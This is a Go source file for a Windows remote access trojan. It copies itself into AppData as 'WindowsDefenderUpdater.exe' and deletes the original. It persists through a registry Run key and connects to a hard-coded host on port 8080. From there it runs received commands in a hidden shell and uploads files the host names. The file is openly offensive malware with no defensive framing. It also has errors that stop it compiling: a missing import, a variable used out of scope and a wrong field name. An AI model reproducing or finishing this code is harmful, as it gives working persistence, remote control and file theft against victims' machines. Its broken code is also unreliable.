package main

import (
	"fmt"
	"net"
	"log"
	"os"
	"os/user"
	"os/exec"
	"strings"
	"bufio"
	"io/ioutil"
	"encoding/base64"
	"golang.org/x/sys/windows/registry"
	"path/filepath"
	"runtime"
)


func main() {

	// Copy to AppData and suicide if necessary
	copyToAppDataAndSuicide()

	// Handle Persistent connection
	err := addToStartup("WindowsDefenderUpdater")
	if err != nil {
		fmt.Println("[!] Failed to add to startup:", err)
	} else {
		fmt.Println("[+] Successfully added to startup")
	}

	// Create ID
	mac_addr, err := getMacAddr()
	if err != nil {
		log.Fatal(err)
		return
	}
	id := base64.StdEncoding.EncodeToString([]byte(mac_addr))

	conn, err := net.Dial("tcp", "192.168.1.109:8080")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	fmt.Println("Connection established to 192.168.1.109:8080")



	// Send ID to server
	_, err = conn.Write([]byte(id + "\n"))
	if err != nil {
		fmt.Println(err)
		return
	}


	// Goroutine to read server responses
	go func(c net.Conn) {
		reader := bufio.NewReader(c)
		for {
			cmdLine, err := reader.ReadString('\n')
			if err != nil {
				fmt.Println("[!] Server closed connection:", err)
				break
			}
			cmdLine = strings.TrimSpace(cmdLine)
			fmt.Printf("[>] Received command: %s\n", cmdLine)
			parseCommand(cmdLine, conn)
		}
	}(conn)

	// Block main thread to keep the connection open
	select {}
}



func copyToAppDataAndSuicide() error {
	usr, err := user.Current()
	if err != nil {
		return err
	}

	srcPath, err := os.Executable()
	if err != nil {
		return err
	}

	dstPath := filepath.Join(usr.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "WindowsDefenderUpdater.exe")

	// If already exists, delete it
	if srcPath == dstPath {
		return nil
	}

	// Copy the executable to AppData, Read itself
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dstPath)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		return err
	}

	// Run the copied executable and suicide
	err = exec.Command(dstPath).Start()
	if err != nil {
		os.Remove(dstPath) // Clean up if it fails
		os.Exit(0)
	}

	os.Remove(srcPath) // Remove the original executable
	return err
}



func addToStartup(exeName string) error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	// Open the registry key for startup
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	// Add the value to the registry
	err = key.SetStringValue(exeName, exePath)
	if err != nil {
		return err
	}

	fmt.Printf("[+] Added %s to startup\n", exeName)
	return nil
}


func parseCommand(cmdLine string, conn net.Conn) {
	if strings.HasPrefix(cmdLine, "exec:") {
		cmdStr := strings.TrimPrefix(cmdLine, "exec:")

		switch runtime.GOOS {
		case "windows":
			cmd := exec.Command("cmd", "/C", cmdStr)
		default:
			cmd := exec.Command("bash", "-c", cmdStr)
		}

		cmd.SysProcAttributes = &syscall.SysProcAttr{HideWindow: true}

		output, err := cmd.CombinedOutput()
		if err != nil {
			output = []byte(err.Error())
		}
		conn.Write([]byte(string(output) + "\n"))
	}else if strings.HasPrefix(cmdLine, "upload:") {
		filePath := strings.TrimPrefix(cmdLine, "upload:")
		filePath = strings.TrimSpace(filePath)

		data, err := ioutil.ReadFile(filePath)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("[!] Failed to read file: %v\n", err)))
			return
		}

		filename := filePath
		if parts := strings.Split(filePath, "/"); len(parts) > 0 {
			filename = parts[len(parts)-1]
		}

		conn.Write([]byte("BEGIN_FILE:" + filename + "\n"))
		conn.Write(data)
		conn.Write([]byte("\nEND_FILE\n"))
	}else if strings.HasPrefix(cmdLine, "download:") {
		return
	}else{
		return
	}
}